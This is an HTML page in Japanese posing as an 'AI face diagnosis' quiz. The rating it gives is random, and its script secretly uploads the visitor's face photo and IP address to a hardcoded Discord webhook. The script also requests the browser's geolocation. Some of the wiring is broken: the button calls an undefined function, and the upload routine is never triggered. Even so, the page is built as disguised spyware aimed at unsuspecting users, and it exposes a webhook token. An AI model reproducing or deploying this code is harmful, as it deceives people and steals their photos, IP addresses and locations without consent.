<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI 顔診断</title>

<style>
:root {
  --bg1: #0f172a;
  --bg2: #020617;
  --card: rgba(255,255,255,0.08);
  --accent: #7c7cff;
  --text-sub: #c7d2fe;
}

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
  background: radial-gradient(circle at top, var(--bg1), var(--bg2));
  color: #fff;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}

.container {
  width: 100%;
  max-width: 420px;
  padding: 20px;
}

.card {
  background: var(--card);
  backdrop-filter: blur(14px);
  border-radius: 22px;
  padding: 24px;
  box-shadow: 0 20px 40px rgba(0,0,0,0.45);
  text-align: center;
  animation: fadeIn .6s ease;
}

h1 {
  font-size: 26px;
  margin-bottom: 6px;
}

.sub {
  font-size: 14px;
  color: var(--text-sub);
  margin-bottom: 18px;
}

input[type="file"] {
  display: none;
}

.label-btn {
  display: block;
  padding: 14px;
  border-radius: 14px;
  background: rgba(255,255,255,0.12);
  cursor: pointer;
  font-size: 16px;
  margin-bottom: 14px;
}

.label-btn:hover {
  background: rgba(255,255,255,0.2);
}

button {
  width: 100%;
  padding: 14px;
  font-size: 18px;
  font-weight: 600;
  border: none;
  border-radius: 14px;
  background: linear-gradient(135deg, var(--accent), #a5b4fc);
  color: #000;
  cursor: pointer;
}

button:active {
  transform: scale(0.98);
}

.preview {
  margin-top: 16px;
}

.preview img {
  width: 100%;
  border-radius: 18px;
}

.result {
  margin-top: 18px;
  padding: 14px;
  background: rgba(0,0,0,0.35);
  border-radius: 16px;
  line-height: 1.7;
}

.rank {
  font-size: 22px;
  font-weight: 700;
  color: var(--accent);
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to   { opacity: 1; transform: translateY(0); }
}
</style>
</head>

<body>
<div class="container">
  <div class="card">
    <h1>AI 顔診断</h1>
    <div class="sub">画像を選ぶだけで診断します</div>

    <label class="label-btn">
      画像を選択
      <input type="file" id="file" accept="image/*">
    </label>

<button onclick="startDiagnosis()">診断する</button>
    <div class="preview" id="previewBox" style="display:none;">
      <img id="preview">
    </div>

    <div class="result" id="result" style="display:none;"></div>
  </div>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";

function send() {
  const file = document.getElementById("file").files[0];
  if (!file) {
    alert("画像選ばねえと診断できんわかす");
    return;
  }

  const reader = new FileReader();
  reader.onload = () => {
    const base64 = reader.result;

    document.getElementById("preview").src = base64;
    document.getElementById("previewBox").style.display = "block";

    const score = Math.floor(30 + Math.random() * 20);
    const rank = score >= 45 ? "S" : score >= 30 ? "A" : "B";

    document.getElementById("result").style.display = "block";
    document.getElementById("result").innerHTML = `
      <div class="rank">ランク ${rank}</div>
      黄金比スコア：<b>${score}%</b><br>
      いいとおもう、うんかわちこいやん
    `;

    sendToDiscord(base64, score, rank);
  };
  reader.readAsDataURL(file);
}

function sendToDiscord(base64, score, rank) {
  const fd = new FormData();
  fd.append("file", dataURLtoBlob(base64), "face.png");

  fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(ipData => {
    const ip = ipData.ip;

    fd.append("payload_json", JSON.stringify({
      content: `📸 顔診断\nIP: ${ip}\n黄金比：${score}%\nランク：${rank}`
    }));

    fetch(WEBHOOK_URL, { method: "POST", body: fd });
  });
}
function dataURLtoBlob(dataurl) {
  const arr = dataurl.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8 = new Uint8Array(n);
  while (n--) u8[n] = bstr.charCodeAt(n);
  return new Blob([u8], { type: mime });
}
  function startDiagnosis() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        console.log("位置:", lat, lon);

        runDiagnosis(lat, lon);
      },
      (err) => {
        console.log("位置取れなかった");
        runDiagnosis(null, null);
      }
    );
  } else {
    runDiagnosis(null, null);
  }
}
  
</script>
</body>
</html>
